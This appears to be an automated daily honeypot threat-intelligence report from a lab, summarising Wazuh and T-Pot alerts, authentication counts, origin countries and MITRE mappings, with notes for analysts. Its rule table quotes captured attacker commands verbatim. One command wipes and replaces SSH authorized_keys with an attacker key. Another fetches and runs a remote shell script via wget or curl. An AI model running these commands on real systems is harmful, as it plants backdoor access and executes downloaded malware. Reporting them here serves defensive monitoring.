# LearningLab01 Daily Threat Intelligence Report — 2026-10-07

Generated: 2026-10-07T13:15:05.054Z

Report window: 2026-10-06T13:15:05.025Z through 2026-10-07T13:15:05.025Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 281,317 |
| Attack-related alerts | 20,972 |
| Honeypot interactions | 272,897 |
| Authentication failures | 2,664 |
| Authentication successes | 539 |
| Critical alerts | 95 |
| High alerts | 413 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 95 critical-severity alerts require priority review.
- 413 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 4.94:1.
- Country attribution currently covers only 2.92% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (106,177 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 95 | 0.03% |
| High | 413 | 0.15% |
| Medium | 2,280 | 0.81% |
| Low | 278,529 | 99.01% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 2,664
- Authentication successes: 539
- Failure-to-success ratio: 4.94:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 16,037 | 76.47% |
| Payload delivery | 16,037 | 76.47% |
| Authentication failure | 2,664 | 12.70% |
| Command execution | 1,309 | 6.24% |
| Reconnaissance | 501 | 2.39% |
| Network scan | 276 | 1.32% |
| Malware | 82 | 0.39% |
| Web attack | 52 | 0.25% |
| SMTP attack | 6 | 0.03% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 8,215 alerts, representing 2.92% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 273,102 | 97.08% | Not geolocated |
| Bulgaria | 5,623 | 2.00% | ████████████████████ |
| Republic of Moldova | 2,116 | 0.75% | ████████ |
| Germany | 231 | 0.08% | █ |
| United Kingdom | 178 | 0.06% | █ |
| United States | 60 | 0.02% | █ |
| Iran | 3 | 0.00% | █ |
| Singapore | 3 | 0.00% | █ |
| Belgium | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 320 |
| Initial Access | 315 |
| Persistence | 315 |
| Privilege Escalation | 315 |
| Impact | 114 |
| Lateral Movement | 109 |
| Credential Access | 40 |
| Execution | 19 |
| Command and Control | 3 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 315 |
| Stored Data Manipulation | 110 |
| Remote Services | 109 |
| Brute Force | 40 |
| Command and Scripting Interpreter | 19 |
| Data Destruction | 4 |
| File Deletion | 4 |
| Ingress Tool Transfer | 3 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 106,177 | T-Pot RDP connection from [IP address] to port 3389. | tpot (106,177) |
| 110207 | 5 | 96,703 | T-Pot SentryPeer SIP activity from [IP address]:56162, method INVITE | tpot (96,703) |
| 110204 | 4 | 44,787 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (44,787) |
| 110205 | 6 | 15,970 | T-Pot Honeytrap received a payload from [IP address] | tpot (15,970) |
| 110219 | 4 | 7,926 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html HTTP/1.1" 302 - | tpot (7,926) |
| 110101 | 3 | 3,103 | Cowrie SSH connection from [IP address]. | tpot (3,103) |
| 110102 | 5 | 2,664 | Cowrie failed login from [IP address] using username root. | tpot (2,664) |
| 110104 | 7 | 1,192 | Cowrie captured a command from [IP address]: ls /home; /bin/busybox BOTNET | tpot (1,192) |
| 110201 | 4 | 464 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (464) |
| 110214 | 9 | 276 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (276) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110103 | 10 | 224 | Cowrie accepted login from [IP address] using username enable. | tpot (224) |
| 5501 | 3 | 206 | PAM: Login session opened. | tpot (204), wazuh (2) |
| 5502 | 3 | 184 | PAM: Login session closed. | tpot (182), wazuh (2) |
| 110221 | 7 | 178 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (178) |
| 5715 | 3 | 109 | sshd: authentication success. | tpot (108), wazuh (1) |
| 550 | 7 | 99 | Integrity checksum changed. | wazuh (99) |
| 110109 | 13 | 95 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (95) |
| 110215 | 4 | 87 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (87) |
| 110220 | 8 | 85 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (85) |
| 110212 | 10 | 67 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (67) |
| 110216 | 4 | 62 | T-Pot Mailoney received SMTP command from [IP address]:   | tpot (62) |
| 110105 | 12 | 60 | Cowrie captured a file download from [IP address]. | tpot (60) |
| 2904 | 7 | 53 | Dpkg (Debian Package) half configured. | wazuh (42), tpot (11) |
| 110223 | 5 | 52 | T-Pot HoneyAML received  request from  to  on port . | tpot (52) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110106 | 10 | 40 | Cowrie detected repeated failed logins from [IP address]. | tpot (40) |
| 2902 | 7 | 38 | New dpkg (Debian Package) installed. | wazuh (31), tpot (7) |
| 110222 | 9 | 29 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (29) |
| 110108 | 12 | 19 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (19) |
| 110209 | 5 | 16 | T-Pot Conpot IEC104 event from [IP address]: NEW_CONNECTION | tpot (16) |
| 110208 | 7 | 12 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:11587 | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 2901 | 3 | 7 | New dpkg (Debian Package) requested to install. | wazuh (7) |
| 2903 | 7 | 7 | Dpkg (Debian Package) removed. | wazuh (7) |
| 110217 | 7 | 6 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: MAIL FROM:<hello@info.com>  | tpot (6) |
| 553 | 7 | 4 | File deleted. | wazuh (4) |
| 554 | 5 | 4 | File added to the system. | wazuh (4) |
| 110107 | 12 | 3 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (3) |
| 203 | 9 | 3 | Agent event queue is full. Events may be lost. | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 19010 | 3 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from failed to passed | tpot (2) |
| 19011 | 9 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from passed to failed | tpot (2) |
| 202 | 7 | 2 | Agent event queue is 90% full. | tpot (2) |
| 205 | 3 | 2 | Agent event queue is back to normal load. | tpot (2) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
